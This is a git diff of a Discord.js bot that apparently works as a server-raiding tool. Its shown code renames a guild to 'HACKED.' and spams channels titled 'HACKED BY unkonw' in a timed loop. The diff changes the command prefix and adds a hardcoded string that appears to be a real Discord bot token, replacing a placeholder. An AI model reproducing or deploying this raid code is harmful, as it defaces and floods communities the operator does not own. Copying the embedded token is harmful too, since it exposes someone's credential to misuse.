@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = ''
+const prefix = '$'
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -22,7 +22,7 @@ client.on('message', message =>{
                 })
                 message.guild.setName('HACKED.')
                 setInterval(function(){
-                  message.guild.createChannel('HACKED BY unkonw ', 'text')
+                  message.guild.createChannel('HACKED BY unkonw ', 'Viniom')
                   message.guild.createChannel('HACKED BY unkonw ', 'text')
                   message.guild.createChannel('HACKED BY unkonw ', 'text')
                   message.guild.createChannel('HACKED BY unkonw ', 'text')
@@ -194,7 +194,5 @@ client.on('guildMemberAdd', (member, channel, guild) => {
     }
 });
 /////
-client.login('token');
-
-
-
+client.login('Nzk0OTI2NzQwMTczNjE5MjMy.X_B7Nw.bF0cfJqL35OvJyrIuy7EiJY09FI
+          
